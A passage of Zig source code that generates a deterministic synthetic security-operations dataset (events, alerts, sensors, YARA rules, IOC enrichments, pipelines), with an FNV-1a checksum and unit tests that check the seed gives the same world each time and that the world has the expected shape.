        const dt_ms = now_ms - self.last_tick_ms;
        if (dt_ms < 250) return; // throttle: 4 Hz is plenty for a trickle
        self.last_tick_ms = now_ms;

        const hour_of_day = @as(f32, @floatFromInt(@mod(@divFloor(now_ms, std.time.ms_per_hour), 24)));
        const rate_per_s = 0.35 * diurnal(hour_of_day) * 1.4;
        self.tick_carry += rate_per_s * @as(f32, @floatFromInt(dt_ms)) / 1000.0;

        var appended = false;
        while (self.tick_carry >= 1.0) : (self.tick_carry -= 1.0) {
            const e = self.benignEvent(store, now_ms);
            store.events.append(store.allocator, e) catch break;
            appended = true;
            // ~4% of trickle events fire a noisy rule as a NEW alert.
            const r = self.rand();
            if (r.intRangeAtMost(u8, 0, 24) == 0) {
                var noisy_ids: [16]u16 = undefined;
                var noisy_n: usize = 0;
                for (rule_defs, 0..) |rd, ri| {
                    if (rd.noisy and noisy_n < noisy_ids.len) {
                        noisy_ids[noisy_n] = @intCast(ri);
                        noisy_n += 1;
                    }
                }
                const rid = noisy_ids[r.intRangeAtMost(usize, 0, noisy_n - 1)];
                const rl = &store.rules.items[rid];
                if (rl.status == .enabled) {
                    var a: domain.Alert = .{
                        .id = self.next_alert_id,
                        .ts_ms = now_ms,
                        .rule = rid,
                        .severity = rl.severity,
                        .technique = rl.technique,
                        .title = domain.FixedStr(96).from(rl.name.slice()),
                        .entity = domain.FixedStr(64).fromFmt("{s} \u{00B7} {s}", .{ store.hostName(e.host), store.userName(e.user) }),
                    };
                    self.next_alert_id += 1;
                    a.event_ids[0] = e.id;
                    a.event_count = 1;
                    store.alerts.append(store.allocator, a) catch {};
                    rl.fires_7d += 1;
                }
            }
        }

        // Sensor eps drift every ~2 s.
        if (@mod(@divFloor(now_ms, 1000), 2) == 0) {
            const r = self.rand();
            for (store.sensors.items) |*s| {
                if (s.status == .down) continue;
                s.eps = @max(1.0, s.eps * (0.97 + r.float(f32) * 0.06));
                s.last_seen_ms = now_ms;
            }
        }
        if (appended) store.touch();
    }

    /// FNV-1a over the world's identity-bearing fields — the determinism
    /// contract check ("same seed ⇒ identical world").
    pub fn checksum(store: *const Store) u64 {
        var h: u64 = 0xcbf29ce484222325;
        const step = struct {
            fn mix(hash: *u64, bytes: []const u8) void {
                for (bytes) |b| {
                    hash.* ^= b;
                    hash.* *%= 0x100000001b3;
                }
            }
        };
        for (store.events.items) |*e| {
            step.mix(&h, std.mem.asBytes(&e.id));
            step.mix(&h, std.mem.asBytes(&e.ts_ms));
            step.mix(&h, e.process.slice());
            step.mix(&h, e.cmdline.slice());
        }
        for (store.alerts.items) |*a| {
            step.mix(&h, std.mem.asBytes(&a.id));
            step.mix(&h, a.title.slice());
            step.mix(&h, a.entity.slice());
        }
        for (store.iocs.items) |*ic| step.mix(&h, ic.value.slice());
        for (store.hosts.items) |*hn| step.mix(&h, hn.slice());
        for (store.users.items) |*un| step.mix(&h, un.slice());
        for (store.sensors.items) |*sn| {
            step.mix(&h, sn.host.slice());
            step.mix(&h, sn.version.slice());
            step.mix(&h, &.{ @intFromEnum(sn.kind), @intFromEnum(sn.status) });
        }
        for (store.rules.items) |*r| {
            step.mix(&h, r.name.slice());
            step.mix(&h, r.query.slice());
            step.mix(&h, std.mem.asBytes(&r.fires_7d));
            step.mix(&h, std.mem.asBytes(&r.fp_7d));
            step.mix(&h, &.{@intFromEnum(r.status)});
        }
        for (store.feeds.items) |*f| {
            step.mix(&h, f.name.slice());
            step.mix(&h, std.mem.asBytes(&f.ioc_count));
            step.mix(&h, &.{@intFromEnum(f.status)});
        }
        for (store.actors.items) |*a| {
            step.mix(&h, a.name.slice());
            step.mix(&h, a.notes.slice());
            step.mix(&h, std.mem.asBytes(&a.technique_count));
        }
        for (store.cases.items) |*c| {
            step.mix(&h, c.title.slice());
            step.mix(&h, c.notes.slice());
            step.mix(&h, std.mem.asBytes(&c.alert_count));
            step.mix(&h, &.{ @intFromEnum(c.severity), @intFromEnum(c.status) });
        }
        for (store.yara.items) |*y| {
            step.mix(&h, y.name.slice());
            step.mix(&h, std.mem.asBytes(&y.gates.fp_count));
            step.mix(&h, std.mem.asBytes(&y.gates.scan_ms));
            step.mix(&h, &.{ @intFromEnum(y.gates.compile), @intFromEnum(y.gates.meta), @intFromEnum(y.gates.tp) });
        }
        for (store.enrichments.items) |*e| {
            step.mix(&h, std.mem.asBytes(&e.ioc_id));
            step.mix(&h, &.{@intFromEnum(e.verdict)});
            step.mix(&h, std.mem.asBytes(&e.det_malicious));
            step.mix(&h, std.mem.asBytes(&e.det_suspicious));
            step.mix(&h, std.mem.asBytes(&e.pivot_count));
        }
        for (store.urlscans.items) |*u| {
            step.mix(&h, std.mem.asBytes(&u.id));
            step.mix(&h, &.{@intFromEnum(u.state)});
        }
        for (store.sources.items) |*src| {
            step.mix(&h, src.name.slice());
            step.mix(&h, &.{ @intFromEnum(src.kind), @intFromEnum(src.state) });
        }
        for (store.pipelines.items) |*p| {
            step.mix(&h, p.name.slice());
            step.mix(&h, &.{ @intFromEnum(p.status), p.step_count, p.test_count });
            for (p.tests[0..p.test_count]) |*ts| {
                step.mix(&h, ts.target.slice());
                step.mix(&h, std.mem.asBytes(&ts.failures));
            }
        }
        for (store.pipeline_runs.items) |*r| {
            step.mix(&h, std.mem.asBytes(&r.id));
            step.mix(&h, std.mem.asBytes(&r.rows_out));
            step.mix(&h, &.{@intFromEnum(r.status)});
        }
        for (store.dead_letters.items) |*dl| {
            step.mix(&h, std.mem.asBytes(&dl.id));
            step.mix(&h, dl.sample.slice());
            step.mix(&h, &.{ @intFromEnum(dl.kind), @intFromEnum(dl.state) });
        }
        return h;
    }
};

test "same seed => identical world; different seed => different world" {
    const base: i64 = 1_750_000_000_000;
    var s1 = Store.init(std.testing.allocator);
    defer s1.deinit();
    var g1 = Generator.init(42, base);
    try g1.build(&s1);

    var s2 = Store.init(std.testing.allocator);
    defer s2.deinit();
    var g2 = Generator.init(42, base);
    try g2.build(&s2);

    try std.testing.expectEqual(s1.events.items.len, s2.events.items.len);
    try std.testing.expectEqual(s1.alerts.items.len, s2.alerts.items.len);
    try std.testing.expectEqual(Generator.checksum(&s1), Generator.checksum(&s2));

    var s3 = Store.init(std.testing.allocator);
    defer s3.deinit();
    var g3 = Generator.init(7, base);
    try g3.build(&s3);
    try std.testing.expect(Generator.checksum(&s1) != Generator.checksum(&s3));
}

test "world shape sane" {
    var s = Store.init(std.testing.allocator);
    defer s.deinit();
    var g = Generator.init(42, 1_750_000_000_000);
    try g.build(&s);

    try std.testing.expect(s.events.items.len > 2000);
    try std.testing.expect(s.alerts.items.len > 60);
    try std.testing.expect(s.cases.items.len == 8);
    try std.testing.expect(s.rules.items.len == rule_defs.len);
    try std.testing.expect(s.iocs.items.len >= 600);

    // Every alert references a live rule + event; chain cases link alerts.
    for (s.alerts.items) |*a| {
        try std.testing.expect(a.rule < s.rules.items.len);
        try std.testing.expect(s.eventById(a.event_ids[0]) != null);
    }
    var linked: usize = 0;
    for (s.cases.items) |*c| linked += c.alert_count;
    try std.testing.expect(linked >= 8);

    // Process-tree integrity: every parent link resolves.
    for (s.events.items) |*e| {
        if (e.parent) |p| try std.testing.expect(s.eventById(p) != null);
    }

    // YARA world shape: all blueprints landed, scripted gate stories hold.
    try std.testing.expectEqual(yara_defs.len, s.yara.items.len);
    var failing: usize = 0;
    for (s.yara.items) |*y| {
        try std.testing.expect(y.technique < attack.techniques.len);
        if (!y.gates.allPass()) failing += 1;
    }
    try std.testing.expectEqual(@as(usize, 4), failing); // meta, tp, fp, perf stories

    // Enrichment: breadth + referential integrity + pivot resolution.
    try std.testing.expect(s.enrichments.items.len > 100);
    for (s.enrichments.items) |*e| {
        try std.testing.expect(s.iocById(e.ioc_id) != null);
        try std.testing.expect(e.detTotal() > 0);
        for (e.pivot_ids[0..e.pivot_count]) |pid| {
            try std.testing.expect(s.iocById(pid) != null);
        }
    }

    // Url scans reference url-type IOCs; lifecycle story present.
    try std.testing.expectEqual(@as(usize, 4), s.urlscans.items.len);
    var pending: usize = 0;
    for (s.urlscans.items) |*u| {
        const ic = s.iocById(u.ioc_id).?;
        try std.testing.expectEqual(domain.IocType.url, ic.type);
        if (u.state == .pending) pending += 1;
    }
    try std.testing.expectEqual(@as(usize, 1), pending);

    // Pipelines: all blueprints landed; scripted stories hold; every run
    // and source reference resolves.
    try std.testing.expectEqual(source_defs.len, s.sources.items.len);
    try std.testing.expectEqual(pipeline_defs.len, s.pipelines.items.len);
    var failing_tests: u32 = 0;
    var err_pipes: u32 = 0;
    for (s.pipelines.items) |*p| {
        try std.testing.expect(s.sourceById(p.source) != null);
        try std.testing.expect(p.step_count > 0);
        failing_tests += p.testCounts().fail;
        if (p.status == .err) err_pipes += 1;
    }
    try std.testing.expectEqual(@as(u32, 2), failing_tests); // accepted_values + freshness stories
    try std.testing.expectEqual(@as(u32, 1), err_pipes);
    try std.testing.expect(s.pipeline_runs.items.len > 10);
    var partial: u32 = 0;
    var failed: u32 = 0;
    for (s.pipeline_runs.items) |*r| {
        try std.testing.expect(s.pipelineById(r.pipeline) != null);
        switch (r.status) {
            .partial => partial += 1,
            .failed => failed += 1,
            else => {},
        }
    }
    try std.testing.expectEqual(@as(u32, 1), partial);
    try std.testing.expectEqual(@as(u32, 3), failed);

    // Dead-letter story: the accepted_values failure spilled samples
    // (capped at 4), all referencing live pipelines/runs.
    try std.testing.expectEqual(@as(usize, 4), s.dead_letters.items.len);
    for (s.dead_letters.items) |*dl| {
        try std.testing.expect(s.pipelineById(dl.pipeline) != null);
        try std.testing.expectEqual(domain.DlqState.open, dl.state);
    }

    // Watermarks: healthy pipelines carry one; the unreachable-source
    // pipeline never advanced (its freshness-fail story).
    for (s.pipelines.items) |*p| {
        if (p.status == .err) {
            try std.testing.expectEqual(@as(i64, 0), p.watermark_ms);
        } else if (p.status == .active) {
            try std.testing.expect(p.watermark_ms > 0);
        }
    }
}

test "enrichmentFor is a pure function of the IOC" {
    var s = Store.init(std.testing.allocator);
    defer s.deinit();
    var g = Generator.init(42, 1_750_000_000_000);
    try g.build(&s);

    const ic = &s.iocs.items[0];
    const a = Generator.enrichmentFor(&s, ic, 111);
    const b = Generator.enrichmentFor(&s, ic, 222);
    try std.testing.expectEqual(a.verdict, b.verdict);
    try std.testing.expectEqual(a.det_malicious, b.det_malicious);
    try std.testing.expectEqual(a.reputation, b.reputation);
    try std.testing.expectEqual(a.creation_ms, b.creation_ms);
    try std.testing.expectEqual(a.pivot_count, b.pivot_count);
    try std.testing.expectEqualSlices(u32, &a.pivot_ids, &b.pivot_ids);
}
